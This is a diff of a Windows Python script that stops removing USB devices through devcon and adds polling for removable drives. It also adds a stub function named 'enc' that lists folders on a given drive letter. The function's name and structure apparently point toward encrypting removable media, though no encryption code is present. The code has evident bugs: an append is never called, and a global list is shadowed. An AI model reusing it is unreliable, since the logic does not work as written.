@@ -1,3 +1,4 @@
+
 import subprocess
 import signal
 import os
@@ -7,6 +8,7 @@ import win32ui
 
 import win32com.client
 
+from threading import Thread
 
 
 import wmi
@@ -137,4 +139,75 @@ def Logical():
 
 
 
-subprocess.run(["devcon", 'remove', "USB\VID_0718&PID_062*"]) #USB\VID_0EA0&PID_2168
+#subprocess.run(["devcon", 'remove', "USB\VID_0718&PID_062*"]) #USB\VID_0EA0&PID_2168
+
+
+#USB()
+
+
+import psutil
+
+global drives
+
+drives = []
+
+
+
+def devHandle():
+    while True:
+        print(len(drives))
+        if(len(drives)>0):
+            for drive in drives:
+                print(drive)
+                # T2 = Thread(target=enc,args=(drive,))
+                # T2.start()
+                # T2.join()
+
+
+def updateDrive():
+    while True:
+        drives.clear()
+        disks = psutil.disk_partitions()
+        tempArray = []
+        for disc in disks:
+            if("fixed" not in disc.opts):
+                tempArray.append(disc.mountpoint[0])
+
+        return tempArray
+
+
+
+
+def main():
+    while True:    
+        deviceArray = updateDrive()
+        drives = deviceArray.copy()
+        #(drives)
+        time.sleep(1)
+
+
+
+
+file_whitelist = ["System Volume Information"]
+def enc(driveLetter):
+    dirs = []
+    try:
+        rootdir = f'{driveLetter}:/'
+        for file in os.listdir(rootdir):
+            if(file not in file_whitelist):
+                dir = os.path.join(rootdir, file)
+                if os.path.isdir(dir):
+                    dirs.append
+    except:
+        pass
+
+
+
+if __name__ == "__main__":
+    
+    # T1 = Thread(target=devHandle, args=())
+    # T1.start()
+
+    # main()
+
+    enc("H")
